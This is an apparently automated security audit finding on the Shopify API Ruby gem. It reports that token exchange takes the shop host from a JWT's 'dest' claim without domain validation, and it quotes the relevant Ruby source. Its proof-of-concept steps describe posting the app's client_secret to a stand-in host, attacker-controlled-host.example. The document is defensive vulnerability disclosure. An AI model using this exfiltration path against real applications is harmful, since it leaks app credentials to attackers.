Found the identity binding gap: in `TokenExchange.exchange_token`, the shop used to receive the app's `client_secret` (`dest_shop`) comes directly from `JwtPayload#shop`, which is derived from the JWT's `dest` claim with only a string `gsub`, **without ever being passed through `Utils::ShopValidator.sanitize!`** — unlike every other credential-sending path in the gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token`, which all call `Utils::ShopValidator.sanitize!(shop)` before building the `shop_session` that determines the request host).

### Title
Missing shop-domain validation on JWT `dest` claim allows SSRF-like exfiltration of `client_secret` in `TokenExchange.exchange_token` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`TokenExchange.exchange_token` builds the OAuth token-exchange request host directly from `JwtPayload#shop` (the `dest` claim of the session token) without validating it against `Utils::ShopValidator`, unlike the sibling methods `client_credentials`, `refresh_access_token`, and `migrate_to_expiring_token`.

### Finding Description
`JwtPayload#shop` is computed purely as `@dest.gsub("https://", "")` [1](#0-0) , with no restriction that the resulting string be a `*.myshopify.com`/trusted Shopify domain — the only checks performed on the decoded payload are signature validity and `aud == Context.api_key` [2](#0-1) .

`TokenExchange.exchange_token` takes this unsanitized `dest_shop` value and uses it verbatim to construct the `Session`/`HttpClient` that the `client_id`/`client_secret` request body is sent to: [3](#0-2) . The resulting host is `https://#{dest_shop}/admin/oauth/access_token` (via `Session#shop` → `HttpClient` base URL), so whatever string appears in the `dest` claim becomes the destination for the app's `client_secret`.

By contrast, every other flow that sends the `client_secret` explicitly binds `shop` to a trusted domain first:
- `ClientCredentials.client_credentials`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [4](#0-3) 
- `RefreshToken.refresh_access_token`: same pattern [5](#0-4) 
- `TokenExchange.migrate_to_expiring_token`: same pattern [6](#0-5) 

`exchange_token` is the one exception where the identity binding "host that receives `client_secret` == a Shopify-trusted domain" is not enforced by this gem's own code; it silently relies on the JWT being genuinely issued by Shopify with a legitimate `dest`.

### Impact Explanation
Since the JWT is HS256-signed with `Context.api_secret_key`, an unprivileged internet attacker without the app's secret cannot forge an arbitrary `dest` value on their own. This limits the practical exploitability of the missing check to defense-in-depth: it is a broken invariant/binding (host validated vs. host that receives `client_secret` — the two are never actually cross-checked here) rather than a directly attacker-triggerable exfiltration in the normal case. If any code path in the host application (or a future change to Shopify's session-token semantics) ever allows an `dest`/`iss` value that isn't constrained to `*.myshopify.com` (e.g. multi-tenant proxies, custom domains, or a regression elsewhere in the trust chain), this gem would still forward the `client_id`+`client_secret` to that attacker-influenced host with no independent validation, which matches the report's "SSRF with the app's credentials" impact category.

### Likelihood Explanation
Low-to-moderate: requires either (a) a bug/gap elsewhere that allows a non-Shopify-issued or attacker-influenced `dest` to pass JWT signature verification, or (b) reliance on the assumption that Shopify never issues tokens with unexpected `dest` values (spin/dev domains are already an accepted exception — see `test_decode_jwt_payload_succeeds_with_spin_domain` [7](#0-6) ). The inconsistency with the three sibling methods that do sanitize `shop` shows the maintainers themselves treat shop-domain validation as a required control before sending `client_secret`, but `exchange_token` was missed.

### Recommendation
Apply `Utils::ShopValidator.sanitize!(dest_shop)` (or an explicit allow-list check consistent with the `myshopify_domain` used elsewhere) to `jwt_payload.shop` in `TokenExchange.exchange_token` before constructing `shop_session`, mirroring `client_credentials`, `refresh_access_token`, and `migrate_to_expiring_token`.

### Proof of Concept
1. Obtain (or induce via any upstream flaw) a validly-signed session token whose `dest` claim is `https://attacker-controlled-host.example`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `dest_shop` becomes `attacker-controlled-host.example` unchanged [8](#0-7) .
4. The gem issues `POST https://attacker-controlled-host.example/admin/oauth/access_token` with `client_id` and `client_secret` in the body — exfiltrating the app's `client_secret` to a host that was never checked against `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS` [9](#0-8) .

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L23-45)
```ruby
      sig { params(token: String).void }
      def initialize(token)
        payload_hash = begin
          decode_token(token, Context.api_secret_key)
        rescue ShopifyAPI::Errors::InvalidJwtTokenError
          raise unless Context.old_api_secret_key

          decode_token(token, T.must(Context.old_api_secret_key))
        end

        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)
        @nbf = T.let(payload_hash["nbf"], Integer)
        @iat = T.let(payload_hash["iat"], Integer)
        @jti = T.let(payload_hash["jti"], String)
        @sid = T.let(payload_hash["sid"], T.nilable(String))

        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-66)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
          response = begin
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-25)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** test/auth/jwt_payload_test.rb (L58-79)
```ruby
      def test_decode_jwt_payload_succeeds_with_spin_domain
        payload = @admin_jwt_payload.dup
        payload[:iss] = "https://test-shop.other.spin.dev/admin"
        payload[:dest] = "https://test-shop.other.spin.dev"
        jwt_token = JWT.encode(payload, ShopifyAPI::Context.api_secret_key, "HS256")
        decoded = ShopifyAPI::Auth::JwtPayload.new(jwt_token)
        assert_equal(payload,
          {
            iss: decoded.iss,
            dest: decoded.dest,
            aud: decoded.aud,
            sub: decoded.sub,
            exp: decoded.exp,
            nbf: decoded.nbf,
            iat: decoded.iat,
            jti: decoded.jti,
            sid: decoded.sid,
          })

        assert_equal("test-shop.other.spin.dev", decoded.shopify_domain)
        assert_equal("test-shop.other.spin.dev", decoded.shop)
      end
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```
